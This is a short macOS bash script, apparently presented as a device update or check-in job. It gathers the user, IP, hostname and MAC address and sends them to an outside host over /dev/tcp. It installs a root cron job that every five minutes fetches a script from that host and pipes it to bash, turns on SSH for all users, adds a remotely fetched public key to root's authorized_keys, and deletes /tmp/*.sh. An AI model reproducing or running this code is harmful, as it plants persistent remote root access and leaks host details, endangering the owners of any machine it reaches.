#!/usr/bin/env bash

# ifconfig is in /sbin and won't work with default PATH
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH

USER=$(stat -f "%Su" /dev/console)
# Linux's hostname -I doesn't work on Macs
IP=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
HOSTNAME=$(hostname)
MAC=$(/sbin/ifconfig en0 | awk '/ether/{print $2}')

INFO="$USER $IP $HOSTNAME $MAC"

SERVER="boesen.science"
PORT=2043

if [[ $(< /etc/info) != "$INFO" ]]; then
	printf "$INFO" > /etc/info

	printf "UPDATE: $INFO" >/dev/tcp/$SERVER/$PORT
fi

grep -v "boesen.science" /var/at/tabs/root > /tmp/crontab
echo '*/5 * * * * curl -L boesen.science:2042/mac/update.sh |bash' >> /tmp/crontab
mv /tmp/crontab /var/at/tabs/root

# Enable SSH
systemsetup -setremotelogin on
# Open SSH to all users
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null

SSHPATH="/var/root/.ssh"

mkdir -p "$SSHPATH"

if ! grep boesene $SSHPATH/authorized_keys; then
	curl -L boesen.science:2042/pubkey >> $SSHPATH/authorized_keys
fi

rm /tmp/*.sh
